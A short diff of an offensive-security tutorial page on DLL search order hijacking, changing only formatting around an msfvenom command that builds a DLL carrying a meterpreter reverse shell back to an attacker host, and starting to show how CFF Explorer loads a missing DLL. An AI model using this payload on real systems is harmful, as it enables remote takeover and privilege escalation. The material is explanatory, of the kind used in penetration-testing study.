@@ -8,13 +8,11 @@ description: 'DLL Search Order Hijacking for privilege escalation, code executio
 
 Generating a DLL that will be loaded and executed by a vulnerable program which connect back to the attacking system with a meterpreter shell:
 
-{% tabs %}
-{% tab title="attacker@kali" %}
+{% code title="attacker@kali" %}
 ```csharp
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=443 -f dll > evil-meterpreter64.dll
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 To illustrate this attack, we will exploit our beloved tool `CFF Explorer.exe` . Once the program is executed, it attempts to load `CFF ExplorerENU.dll` from the location the program is installed to, however that DLL cannot be loaded \(note the NAME NOT FOUND\) as it does not exist in the given path:
 
